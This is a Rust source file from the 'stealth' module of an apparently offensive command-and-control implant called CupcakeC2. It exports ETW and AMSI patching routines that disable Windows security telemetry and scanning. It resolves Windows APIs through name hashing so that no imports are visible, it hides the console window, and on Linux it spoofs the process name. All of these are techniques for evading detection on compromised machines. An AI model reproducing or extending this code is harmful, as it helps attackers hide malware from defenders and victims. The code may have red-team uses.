// Client/core/src/stealth/mod.rs
// CupcakeC2 V3 Stealth Subsystem

#[cfg(windows)]
pub mod peb;
#[cfg(windows)]
pub mod integrity;
#[cfg(windows)]
pub mod mask;
#[cfg(windows)]
pub mod stack;

#[cfg(windows)]
pub use peb::{get_module_base, get_api_addr};
#[cfg(windows)]
pub use integrity::{patch_etw, patch_amsi};


pub const fn hash_module_name(s: &[u8]) -> u32 {
    let mut h: u32 = 0;
    let mut i = 0;
    while i < s.len() {
        let mut c = s[i] as u32;
        if c >= b'A' as u32 && c <= b'Z' as u32 {
            c += 32;
        }
        h = h.wrapping_mul(31).wrapping_add(c);
        i += 1;
    }
    h
}

pub const fn hash_api_name(s: &[u8]) -> u32 {
    let mut h: u32 = 0;
    let mut i = 0;
    while i < s.len() {
        h = h.wrapping_mul(31).wrapping_add(s[i] as u32);
        i += 1;
    }
    h
}

pub fn hide_console() {
    #[cfg(windows)]
    unsafe {
        let h_module = get_module_base(hash_module_name(b"kernel32.dll"));
        let get_console = get_api_addr(h_module, hash_api_name(b"GetConsoleWindow"));
        if let Some(get_console_addr) = get_console {
            let get_console_win: unsafe extern "system" fn() -> usize = std::mem::transmute(get_console_addr);
            let win = get_console_win();
            if win != 0 {
                let user32 = get_module_base(hash_module_name(b"user32.dll"));
                if let Some(show_window) = get_api_addr(user32, hash_api_name(b"ShowWindow")) {
                    let show: extern "system" fn(usize, i32) -> i32 = std::mem::transmute(show_window);
                    show(win, 0); // SW_HIDE
                }
            }
        }
    }
}

pub fn setup_diagnostic_console() {
    #[cfg(windows)]
    unsafe {
        let h_kernel32 = get_module_base(hash_module_name(b"kernel32.dll"));
        
        // 1. Aggressively try to get a console
        if let Some(alloc_addr) = get_api_addr(h_kernel32, hash_api_name(b"AllocConsole")) {
            let alloc_console: unsafe extern "system" fn() -> i32 = std::mem::transmute(alloc_addr);
            alloc_console();
        }

        // 2. Fallback diagnostic: OutputDebugStringA (View with DebugView)
        if let Some(ods_addr) = get_api_addr(h_kernel32, hash_api_name(b"OutputDebugStringA")) {
            let ods: unsafe extern "system" fn(*const u8) = std::mem::transmute(ods_addr);
            ods(b"CupcakeC2: Diagnostic Console Requested\n\0".as_ptr());
        }
        
        // 3. Re-open standard streams to the console
        if let Some(set_std_addr) = get_api_addr(h_kernel32, hash_api_name(b"SetStdHandle")) {
            if let Some(create_file_addr) = get_api_addr(h_kernel32, hash_api_name(b"CreateFileA")) {
                let create_file: unsafe extern "system" fn(*const u8, u32, u32, *mut (), u32, u32, *mut ()) -> usize = std::mem::transmute(create_file_addr);
                let set_std_handle: unsafe extern "system" fn(u32, usize) -> i32 = std::mem::transmute(set_std_addr);
                
                let conout = b"CONOUT$\0";
                let h_con = create_file(conout.as_ptr(), 0xC0000000, 2, std::ptr::null_mut(), 3, 0, std::ptr::null_mut());
                
                if h_con != (usize::MAX) {
                    set_std_handle(0xFFFFFFF5, h_con); // STD_OUTPUT_HANDLE
                    set_std_handle(0xFFFFFFF4, h_con); // STD_ERROR_HANDLE
                    
                    // Direct confirmation write
                    if let Some(write_addr) = get_api_addr(h_kernel32, hash_api_name(b"WriteConsoleA")) {
                        let write_console: unsafe extern "system" fn(usize, *const u8, u32, *mut u32, *mut ()) -> i32 = std::mem::transmute(write_addr);
                        let msg = b"\r\n========================================\r\n[!] CUPCAKE C2 DIAGNOSTIC CONSOLE\r\n[+] Console Allocated Successfully\r\n========================================\r\n\r\n";
                        let mut written = 0;
                        write_console(h_con, msg.as_ptr(), msg.len() as u32, &mut written, std::ptr::null_mut());
                    }
                }
            }
        }
    }
}

pub async fn stealth_sleep(duration_ms: u32) {
    #[cfg(windows)]
    {
        crate::utils::db_print(&format!("[Cupcake] stealth_sleep() called. Temporarily using tokio::time::sleep for {} ms", duration_ms));
        tokio::time::sleep(tokio::time::Duration::from_millis(duration_ms as u64)).await;
    }
    #[cfg(not(windows))]
    {
        tokio::time::sleep(tokio::time::Duration::from_millis(duration_ms as u64)).await;
    }
}

pub fn spoof_process_name(_name: &str) {
    #[cfg(target_os = "linux")]
    {
        if let Ok(c_name) = std::ffi::CString::new(_name) {
            unsafe {
                libc::prctl(15, c_name.as_ptr(), 0, 0, 0);
            }
        }
    }
}
